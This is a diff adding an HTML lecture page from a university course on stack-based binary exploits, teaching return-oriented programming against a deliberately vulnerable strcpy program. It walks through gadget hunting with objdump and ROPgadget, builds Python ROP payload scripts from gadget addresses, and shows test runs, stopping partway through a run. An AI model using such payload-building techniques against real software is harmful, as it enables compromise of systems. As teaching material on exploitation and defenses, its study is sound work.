@@ -1,0 +1,1122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-12-04 Fri 17:53 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 24: If You Can Write an 'A' You Can Do Anything!</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script type="text/javascript"
+        src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 24: If You Can Write an 'A' You Can Do Anything!</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline2">1. ROP Chains</a>
+<ul>
+<li><a href="#orgheadline1">1.1. The goal for our ROP chain</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline9">2. Building a ROP chain from scratch</a>
+<ul>
+<li><a href="#orgheadline3">2.1. Finding Some Useful Gadgets</a></li>
+<li><a href="#orgheadline4">2.2. Building a useful chain</a></li>
+<li><a href="#orgheadline5">2.3. Write an "A\0" to memory ROP chain</a></li>
+<li><a href="#orgheadline6">2.4. Executing the ROP Chain</a></li>
+<li><a href="#orgheadline7">2.5. Gadgets within Other Operations</a></li>
+<li><a href="#orgheadline8">2.6. Automated Gadget Hunting</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline12">3. Completing the Exploit</a>
+<ul>
+<li><a href="#orgheadline10">3.1. Printing a Sequence of Chars</a></li>
+<li><a href="#orgheadline11">3.2. Launching a shell</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-2">
+<h2 id="orgheadline2"><span class="section-number-2">1</span> ROP Chains</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+The concepts of Return Oriented Programming are really
+powerful. Previously, we saw where we can use a gadget to manipulate
+the stack so that we can chain functions together with different
+numbers of arguments. This time, we are going to try and write full
+exploits using only gadgets.
+</p>
+
+<p>
+The difference in these procedures is that we are now going to
+leverage a quirk of x86. It is a variable length instruction set,
+which means that not all instructions fit within a set boundary. There
+are advantages to this with respect to performance of the CPU, e.g.,
+the CPU can load multiple instructions with a single load call if the
+instructions are short enough, but this also means that embedded
+within natural code there is a hidden code if things get slightly out
+of align. Think about it: What is an instruction anyway other than
+just some bytes? It doesn't really matter where we find those bytes as
+long as they do what we need. The key is finding all the gadgets we
+need to get the job done and then chaining those gadgets together.
+</p>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-3">
+<h3 id="orgheadline1"><span class="section-number-3">1.1</span> The goal for our ROP chain</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+The basic concept of ROP chaining is that a gadget is a small set of
+instructions, one or two, followed by a return. If we were to write
+the address of these instructions on the stack overwriting the return
+address, we can then chain a whole bunch together just like we did
+before. Each gadget does a simple tasks, but many of them could result
+in an exploit.
+</p>
+
+<p>
+To start, we will use the following program that is compiled
+statically with glibc to give us a bit more code to play with in a
+nice predictable place.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c++"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[100];
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"Buf: %s\n"</span>, buf);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+    vuln(argv[1]);
+}
+</pre>
+</div>
+
+<p>
+The goal is to get this program to print 'A' to stdout, if we can do
+that, we can do anything. It means we can do arbitrary system calls to
+do arbitrary work. To start, let's remember how we would normally
+print an 'A' in x86:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">section</span> .txt
+ <span style="color: #00ffff;">global</span> _start
+
+<span style="color: #87cefa;">_start</span>:
+ <span style="color: #00ffff;">xor</span> eax,eax
+
+ <span style="color: #00ffff;">push</span> eax
+ <span style="color: #00ffff;">push</span> BYTE 0x41 <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">'A'</span>
+
+ <span style="color: #00ffff;">mov</span> ebx,eax <span style="color: #ff7f24;">; </span>
+ <span style="color: #00ffff;">inc</span> ebx <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">1 for stdout</span>
+
+ <span style="color: #00ffff;">mov</span> ecx,esp  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">references 'A'</span>
+
+ <span style="color: #00ffff;">mov</span> edx,eax
+ <span style="color: #00ffff;">inc</span> edx <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">length of 'A'. 1</span>
+
+ <span style="color: #00ffff;">inc</span> eax
+ <span style="color: #00ffff;">inc</span> eax
+ <span style="color: #00ffff;">inc</span> eax
+ <span style="color: #00ffff;">inc</span> eax <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">eax is 4 for sys_write</span>
+
+ <span style="color: #00ffff;">int</span> 0x80
+</pre>
+</div>
+
+
+<p>
+I've purposely written this to use small instructions so we can more
+easily find some gadgets that meet these instructions. Now the
+challenge is to find the codes we are interested in, but the crux of
+the matter is getting the following registers set up:
+</p>
+
+<pre class="example">
+eax 0x3
+ebx 0x1
+ecx &lt;"A\0"&gt;  (address of a null terminate string)
+edx 0x1
+int 0x80
+</pre>
+
+<p>
+If we can get that, then we can write an 'A' to stdout, or any
+arbitrary string we choose.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline9" class="outline-2">
+<h2 id="orgheadline9"><span class="section-number-2">2</span> Building a ROP chain from scratch</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+The first thing we need to do in order to build a ROP chain is to find
+gadgets. First we will look at doing this manually by searching for
+gadgets using <code>objdump</code> and <code>grep</code>. Latter we'll look at doing this in
+a more automated fashion.
+</p>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">2.1</span> Finding Some Useful Gadgets</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+Let's use objdump and grep to get things started. Recall that the <code>-A</code>
+option says to print two lines after a match, and the <code>-B</code> options
+says to print two lines before a match. If we do just a general
+search, the first kind of gadgets that apear are all in the
+pop;pop;ret category.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | head -31
+ 80481c6:	83 c4 08             	add    esp,0x8
+ 80481c9:	5b                   	pop    ebx
+ 80481ca:	c3                   	ret    
+--
+ 804838d:	5f                   	pop    edi
+ 804838e:	5d                   	pop    ebp
+ 804838f:	c3                   	ret    
+--
+ 804841e:	5f                   	pop    edi
+ 804841f:	5d                   	pop    ebp
+ 8048420:	c3                   	ret    
+--
+ 804846e:	5e                   	pop    esi
+ 804846f:	5f                   	pop    edi
+ 8048470:	c3                   	ret    
+--
+ 8048549:	5f                   	pop    edi
+ 804854a:	5d                   	pop    ebp
+ 804854b:	c2 04 00             	ret    0x4
+--
+ 8048710:	5f                   	pop    edi
+ 8048711:	5d                   	pop    ebp
+ 8048712:	c3                   	ret    
+--
+ 80488d5:	5f                   	pop    edi
+ 80488d6:	5d                   	pop    ebp
+ 80488d7:	c3                   	ret    
+--
+ 8048922:	5e                   	pop    esi
+ 8048923:	5f                   	pop    edi
+ 8048924:	c3                   	ret
+</pre>
+
+<p>
+These are all usable gadgets because they allow us to set registers
+arbitrarily by popping something off the stack into a register. In
+genreal, there are going to be three really useful kinds of gadgets
+which we will need to find:
+</p>
+
+<ul class="org-ul">
+<li>pop reg : this will allow us to control the value in a register
+since we control the stack</li>
+<li>xor reg, reg : zero a register</li>
+<li><code>mov dword ptr [r1], r2</code> : this will allow us to write to arbitrary memory</li>
+</ul>
+
+<p>
+We already have at least a few of those above. For example, already,
+we have found a lot of useful gadgets, such as: <code>pop esi;pop edi;
+ret;</code>. This will allow us to arbitrarily set the value of edi and esi
+like following:
+</p>
+
+<pre class="example">
+|  &lt;next gadget &gt;        |
+|   value for edi        |
+|   value for esi        |
+| &lt;pop esi;pop edi; ret&gt; |
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-3">
+<h3 id="orgheadline4"><span class="section-number-3">2.2</span> Building a useful chain</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Let's look for a bit more useful gadgets:
+</p>
+
+<pre class="example">
+objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 -B 1 xor
+(...)
+--
+80b80d5:	5d                   	pop    ebp
+ 80b80d6:	31 c0                	xor    eax,eax
+ 80b80d8:	c3                   	ret
+</pre>
+<p>
+This gadget will zero out eax and set the value of ebx!  Or if we just
+jump to the xor, simply zero out the value for eax. We also need a
+gadget to increment the value in eax:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 -B 1 inc 
+(...)
+--
+ 805caec:	40                   	inc    eax
+ 805caed:	5f                   	pop    edi
+ 805caee:	c3                   	ret
+</pre>
+<p>
+And we need a gadget to write to memory based on a register, something
+like <code>mov DWORD[edx],eax</code>
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 "DWORD PTR \[edx\],eax"
+(...)
+ 809a70d:	89 02                	mov    DWORD PTR [edx],eax
+ 809a70f:	c3                   	ret    
+--
+</pre>
+<p>
+Now we have everything we need except a place to write too. For that
+we can use any old place in the data segment. Turns out 0x080ea060 is
+perfect for that.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-3">
+<h3 id="orgheadline5"><span class="section-number-3">2.3</span> Write an "A\0" to memory ROP chain</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+If we can find the <i>right</i> gadgets, then writing a ROP chain to just
+write "A\0" to a memory location is actually rather straight
+forward. It should look something like this:
+</p>
+
+
+<pre class="example">
+   | &lt;mov [edx],eax;ret&gt; | write '0000' to address 0x080ea61
+   | 0x080ea061           | next byte after 0x80ea61
+   | &lt;pop edx; ret&gt;      | store next value in edx
+   | &lt;xor eax,eax; ret&gt;  | zero eax
+   | &lt;mov [edx],eax;ret&gt; | write 'AAAA' to address 0x080ea60
+   | 0x41414141          | 'AAAA'
+   | &lt;pop eax;ret&gt;       | store next value in eax
+^  | 0x080ea060           | address we will write to, now stored in edx
+|  | &lt;pop edx; ret&gt;      |  store next value in edx
+</pre>
+
+<p>
+Reading from bottom to top up the stack. First we move the address we
+want to write to into edx with a pop, then similarly we move a bunch
+of A's into eax. Then we can write to the address edx the A's in
+eax. Once we zero out eax and write that to the next byte, we should
+have the string "A\0" at address 0x080ea061. 
+</p>
+
+
+<p>
+Let's find the right gadgets. First we need <code>pop edx;ret</code>:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*edx" 
+ 806e97a:	5a                   	pop    edx
+ 806e97b:	c3                   	ret
+</pre>
+<p>
+Then we need a pop <code>pop eax; ret</code>. Unfortunately, finding this is
+harder, and unfortunately, the one I found does a bunch of other
+stuff:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*eax" 
+ 809e08a:	58                   	pop    eax
+ 809e08b:	5b                   	pop    ebx
+ 809e08c:	5e                   	pop    esi
+ 809e08d:	5f                   	pop    edi
+ 809e08e:	c3                   	ret
+</pre>
+<p>
+But that's fine, we can handle that. And, we already have the <code>mov</code> command:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 "DWORD PTR \[edx\],eax"
+(...)
+ 809a70d:	89 02                	mov    DWORD PTR [edx],eax
+ 809a70f:	c3                   	ret    
+--
+</pre>
+<p>
+The last thin we need is <code>xor</code> eax command:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 1 ret | grep -A 1 "xor.*eax,eax" 
+ 8054200:	31 c0                	xor    eax,eax
+ 8054202:	c3                   	ret    
+(...)
+</pre>
+
+<p>
+This means we can put together the chain like so:
+</p>
+
+<pre class="example">
+0x0809a70d  | &lt;mov [edx],eax;ret&gt; | write '0000' to address 0x080ea61
+0x080ea061  | 0x080ea061          | next byte after 0x80ea61
+0x0806e97a  | &lt;pop edx; ret&gt;      | store next value in edx
+0x08054202  | &lt;xor eax,eax; ret&gt;  | zero eax
+0x0809a70d  | &lt;mov [edx],eax;ret&gt; | write 'AAAA' to address 0x080ea60
+0xdeadbeef  | 0xdeadbeef          | to be stored in edi
+0xdeadbeef  | 0xdeadbeef          | to be stored in esi
+0xdeadbeef  | 0xdeadbeef          | to be stored in ebx
+0x41414141  | 0x41414141          | 'AAAA' to be stored in eax
+0x0809e080  | &lt;pop eax; pop ebx; pop esi; pop edi ret&gt;       | store next value in eax
+0x080ea060  | 0x080ea060          | address we will write to, now stored in edx
+0x0806e87a  | &lt;pop edx; ret&gt;      |  store next value in edx
+</pre>
+
+<p>
+Notice the <code>0xdeadbeef</code>. This is because the gadget to set eax comes
+with some added bagage, namely a bunch of extra pop's that have to be
+handled. These pop's will clear the stack of values, so we need to add
+some values on the stack, 0xdeadbeef's, so we don't interfere with the
+rest of the chain.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">2.4</span> Executing the ROP Chain</h3>
+<div class="outline-text-3" id="text-2-4">
+<p>
+One problem with ROP chains is that they are long, much longer then
+something we can just casually type on the command line. It then makes
+sense to store it in a file, and python is the right tool for the job.
+</p>
+
+<pre class="example">
+p = 'A'*0x70 #put padding here
+
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea060) #address to write to
+p += pack('&lt;I', 0x0809e080) #pop eax;pop ebx; pop esi; pop edi; ret
+p += pack('&lt;I', 0x41414141) #'AAAA'
+p += pack('&lt;I', 0xdeadbeef) # filler
+p += pack('&lt;I', 0xdeadbeef) # filler
+p += pack('&lt;I', 0xdeadbeef) # filler
+p += pack('&lt;I', 0x0809a70d) # mov [edx],eax;ret
+p += pack('&lt;I', 0x08054202) # xor eax,eax
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea061) #address to write to
+p += pack('&lt;I', 0x0809a70d) # mov [edx],eax;ret
+p += pack('&lt;I', 0xcafebabe) #  will segfault here
+print p
+</pre>
+
+<p>
+Note that the <code>pack('&lt;I',0xdeadbeef)</code> will create a properly formatted
+little Endian string of 0xdeadbeef. Also note that we built the
+exploit string in reverse order from the presentation above. I also
+places a 0xcafebabe in there so we can know if we segfaulted and
+reached the end of our ropchain, so let's try it out and see if we get
+there:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`??
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[1551626.753436] vulnerable[10562]: segfault at bf00e080 ip bf00e080 sp bffff618 error 14
+</pre>
+
+<p>
+Hmm. It did not work, why? Well look closely a the <code>ip</code> we segfaulted
+on 0xbf00e080. There is a null byte in there, and also that looks a
+lot like the address for our <code>pop eax; pop ebx; pop esi; pop edi;
+ret;</code> at 0x0809e080. The 0x098 did not wite onto the stack, and the
+reason for that is 0x09 is '\t' (tab) and that terminated the
+<code>strcpy()</code>. 
+</p>
+
+<p>
+It turns out that not all of our gadgets that we find can be used
+because the address may contain values we can't include in the
+overflow. Looks like we need to hunt for more gadgets!
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">2.5</span> Gadgets within Other Operations</h3>
+<div class="outline-text-3" id="text-2-5">
+<p>
+One thing we can leverage here is that x86 is not a fixed size
+instruction set. Instead, any sequence of bytes could be a valid
+instruction. Before, the address of <code>pop eax</code> gadget was at an address
+that was not useful, but we can look for another one that might be
+embeded elsehwere.
+</p>
+
+<p>
+To start, it is worthwhile to know that byte 0xc3 is the return
+operation and address 0x58 is the <code>pop eax</code> instruction. In that case,
+we can do a search for that address and find:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel vulnerable  |  grep -B 2 "c3" | grep -A 2 58
+(...)
+80bb744:	8b 40 58             	mov    eax,DWORD PTR [eax+0x58]
+80bb747:	c3                   	ret    
+(...)
+</pre>
+
+<p>
+And there, within that mov instruction, we see that there is a 0x58
+followed by a 0xc3. That means we can use address 0x080bb746 in our
+ROP chain. Now we can use the following rop chain:
+</p>
+
+<pre class="example">
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea060) #address to write to
+p += pack('&lt;I', 0x080bb746) #pop eax; ret
+p += pack('&lt;I', 0x41414141) #'AAAA'
+p += pack('&lt;I', 0x0809a70d) # mov [edx],eax;ret
+p += pack('&lt;I', 0x08054202) # xor eax,eax
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea061) #address to write to
+p += pack('&lt;I', 0x0809a70d) # mov [edx],eax;ret
+p += pack('&lt;I', 0xcafebabe) #  will segfault here
+</pre>
+
+<p>
+And if we test it to see if we get to the 0xcafebabe:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
+?                                                                                                                       AAAA
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[1555336.602578] vulnerable[10650]: segfault at 800a70d ip 0800a70d sp bffff630 error 14 in vulnerable[8048000+a1000]
+</pre>
+
+<p>
+Not again. This time it is 0x09 in the <code>mov [edx],eax; ret</code>
+instruction. Seems like we need a better way because we can continue
+to explore for these embedded gasgets, but thats a lot of
+work. Thankfully, there are tools to make this a lot easier.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-3">
+<h3 id="orgheadline8"><span class="section-number-3">2.6</span> Automated Gadget Hunting</h3>
+<div class="outline-text-3" id="text-2-6">
+<p>
+Because it's a pain in the ass to find the ROP gadgets by hand, people
+have developed automated tools for both finding gadgets and
+automatically assembling exploits based on those gadgets. The one
+we'll focus on today is <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>. You should work to install it on
+your own virtual box system.
+</p>
+
+<p>
+While ROPgadget does all sorts of cool things, we'll primarily use it
+to find gadgets for us. Here's the most basic usage where I am just
+seperating out the pop eax instructions:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": pop eax "
+0x0808f020 : pop eax ; adc al, -0x7b ; sal byte ptr [edx + ecx + 0xffffffc1], cl ; retf
+0x080a9926 : pop eax ; adc al, 0x39 ; ret
+0x080e01f5 : pop eax ; add byte ptr [eax], al ; mov bh, dl ; clc ; jmp dword ptr [ebx]
+0x0806c1b6 : pop eax ; add byte ptr [eax], al ; xor eax, eax ; leave ; ret
+0x080e0e1c : pop eax ; add byte ptr fs:[eax], al ; add byte ptr [eax], -7 ; jmp edi
+0x08054a15 : pop eax ; and al, -0x77 ; dec eax ; or al, 1 ; retf 0x5089
+0x0808cf6d : pop eax ; and bl, ch ; ret -0x4b73
+0x0805ae06 : pop eax ; je 0x805ae17 ; add esp, 0x68 ; pop ebx ; ret
+0x0809d932 : pop eax ; jmp dword ptr [eax]
+0x0809e5b3 : pop eax ; mov dword ptr [esp + 4], eax ; call 0x80ab047
+0x0807b5c8 : pop eax ; mov eax, 0x77 ; int 0x80
+0x080858e1 : pop eax ; mov eax, edx ; add esp, 0x1c ; ret
+0x0805c84c : pop eax ; mov edi, eax ; mov esi, edx ; mov eax, dword ptr [esp + 4] ; ret
+0x080539ce : pop eax ; or al, -0x77 ; push eax ; add al, -0x77 ; dec eax ; and al, 0x5b ; ret
+0x080573eb : pop eax ; or al, 0x39 ; ret
+0x0808b691 : pop eax ; or byte ptr [ebx + 0x89010442], al ; retf -0x1e7d
+0x0808c521 : pop eax ; or byte ptr [ecx + 0x20488910], cl ; pop ebx ; ret
+0x080e359d : pop eax ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret
+0x080e5cff : pop eax ; or cl, byte ptr [esi] ; or al, 0x41 ; ret
+0x08058169 : pop eax ; or dh, dh ; ret
+0x0804a0cf : pop eax ; or dh, dh ; ret 0xfdf
+0x0809e02a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080e105d : pop eax ; push cs ; adc al, 0x41 ; ret
+0x080bb746 : pop eax ; ret  &lt;---
+0x08071fba : pop eax ; ret 0x80e
+0x080b0914 : pop eax ; retf
+0x080554f9 : pop eax ; xor byte ptr [ebx + 0xffffff83], bl ; retf -0x7cfe
+</pre>
+
+<p>
+In the list, indicated with an "&lt;&#x2014;", you see the <code>pop eax;ret</code> we
+found earlier. Now we only need to find <code>mov [edx],eax</code> instruction:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": mov dword ptr \[edx\]"
+0x080e62a9 : mov dword ptr [edx], cs ; push cs ; adc al, 0x41 ; ret
+0x080e3b65 : mov dword ptr [edx], cs ; push cs ; adc al, 0x43 ; ret
+0x080e345b : mov dword ptr [edx], cs ; push cs ; or al, 0x41 ; ret
+0x08066fc4 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 1] ; pop edi ; ret
+0x08067104 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 1] ; ret
+0x08066ef2 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 3] ; pop edi ; ret
+0x08067122 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 3] ; ret
+0x080656a2 : mov dword ptr [edx], eax ; mov eax, edi ; pop edi ; ret
+0x08065894 : mov dword ptr [edx], eax ; mov eax, edx ; ret
+0x080a713b : mov dword ptr [edx], eax ; mov ebx, dword ptr [ebp + 0xfffffffc] ; leave ; ret
+0x0808fc26 : mov dword ptr [edx], eax ; pop ebx ; ret &lt;-- but this one works fine
+0x0809a70d : mov dword ptr [edx], eax ; ret  &lt;--- One from before
+0x0807457c : mov dword ptr [edx], ecx ; add esp, 0x6c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0805ee34 : mov dword ptr [edx], ecx ; mov eax, dword ptr [esp + 4] ; ret
+0x080e4871 : mov dword ptr [edx], ecx ; push cs ; adc al, 0x43 ; ret
+0x08054992 : mov dword ptr [edx], ecx ; ret
+</pre>
+
+<p>
+As you can see, we found the previous one from before with the 0x09
+tab in it, but we can also find one that does the same, but with a
+<code>pop ebx</code> in the middle without a 0x09 in the address. So now we have
+the following, where we use 0xdeadbeef to pop into ebx
+</p>
+
+<pre class="example">
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea060) #address to write to
+p += pack('&lt;I', 0x080bb746) #pop eax; reat;
+p += pack('&lt;I', 0x41414141) #'AAAA'
+p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx
+p += pack('&lt;I', 0x08054202) # xor eax,eax
+p += pack('&lt;I', 0x0806e97a) #pop edx; ret
+p += pack('&lt;I', 0x080ea061) #address to write to
+p += pack('&lt;I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
+p += pack('&lt;I', 0xdeadbeef) #  filler for pop ebx
+p += pack('&lt;I', 0xcafebabe) #  will segfault here
+</pre>
+
+<p>
+And if we run this, we see we segfault on cafebabe, hurray!
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
